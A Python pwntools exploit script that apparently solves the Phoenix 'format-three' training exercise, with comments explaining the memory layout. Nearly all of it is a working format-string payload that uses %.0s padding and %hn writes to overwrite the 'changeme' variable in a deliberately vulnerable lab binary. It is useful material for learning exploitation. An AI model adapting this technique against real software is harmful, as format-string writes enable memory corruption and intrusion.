#!/usr/bin/env python3
from pwn import *

path = "/opt/phoenix/amd64/format-three"
context.binary = path
# context.log_level = "debug"

# changeme goal = 0x64457845
# in memory: LO< | 45 78 | 45 64 | 00 00 | 00 00 | > HI
#                (0x7845) (0x6445)
# write second part first, %hn at a time

# 5 bytes long decimal
count1 = 0x6445
count1 = str(count1).encode("ascii")
# 4 bytes long decimal
count2 = 0x7845 - 0x6445
count2 = str(count2).encode("ascii")

# I originally thought this to be impossible until I found
# we could use %.0s to consume argument without printing anything:
# https://stackoverflow.com/a/16765923
# %016llx wouldn't have fit the buffer (spend 7 bytes to skip 8 bytes of buffer)

# skip 11 * sizeof(size_t) bytes to reach start of buffer
payload = b"%.0s" * 11  # 4 * 11 = 44
# skip over the buffer
payload += b"%.0s" * (17 - 1)  # 4 * 17 = 68
# print 0x6445 chars
payload += b"%0" + count1 + b"llx"  # 2 + 5 + 3 = 10
# write 0x4564 to changeme+2
payload += b"%hn"  # 3
# print 0x7845-0x6445 chars
payload += b"%0" + count2 + b"llx"  # 2 + 4 + 3 = 9
# write 0x4578 to changeme
payload += b"%hn"  # 3
payload += b"\x00\x00\x00"  # padding
payload += pack(context.binary.symbols["changeme"] + 2)
payload += pack(0xDEADBEEFCAFEBABE)  # padding for the %x between %hn's
payload += pack(context.binary.symbols["changeme"])

io = process(path)
print(io.recvline())  # Welcome
io.sendline(payload)
io.recvuntil(b"deadbeefcafebabe")
print(io.recvline().decode("ascii"))  # printf
